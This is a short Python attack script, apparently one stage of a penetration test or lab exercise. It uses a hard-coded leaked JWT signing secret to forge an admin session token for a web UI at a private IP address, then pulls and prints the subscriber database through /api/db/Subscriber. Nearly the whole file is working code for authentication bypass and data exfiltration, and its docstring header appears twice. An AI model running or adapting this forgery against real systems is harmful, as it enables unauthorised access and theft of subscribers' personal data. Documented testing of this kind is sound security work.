#!/usr/bin/env python3
"""
Stage 8 (extended) — JWT Forgery via Leaked Signing Secret
Scenario 2: Subscriber Data Exfiltration

Goal: forge a valid, admin-privileged WebUI session token using the
JWT_SECRET_KEY leaked from /var/lib/webui/.env (Stage 8 discovery),
demonstrating full authentication bypass independent of any actual
credential or account.
"""

#!/usr/bin/env python3
"""
Stage 8 (extended) — JWT Forgery, retargeted to real routes
Scenario 2: Subscriber Data Exfiltration
"""

import jwt
import requests
import json

JWT_SECRET_KEY = "18f9d7aa5ad025ca476231dca717cfac84ba62cef569b368d9f3a38d6e3cf318"
WEBUI_BASE = "http://192.168.134.128:3000"

forged_payload = {
    "user": {
        "_id": "000000000000000000000001",
        "username": "admin",
        "roles": ["admin"]
    }
}

forged_token = jwt.encode(forged_payload, JWT_SECRET_KEY, algorithm="HS256")
headers = {"Authorization": f"Bearer {forged_token}"}

print("[*] Testing forged admin token against /api/db/Subscriber ...")
resp = requests.get(f"{WEBUI_BASE}/api/db/Subscriber", headers=headers)
print(f"    Status: {resp.status_code}")
if resp.status_code == 200:
    print(json.dumps(resp.json(), indent=2))
else:
    print(resp.text[:500])
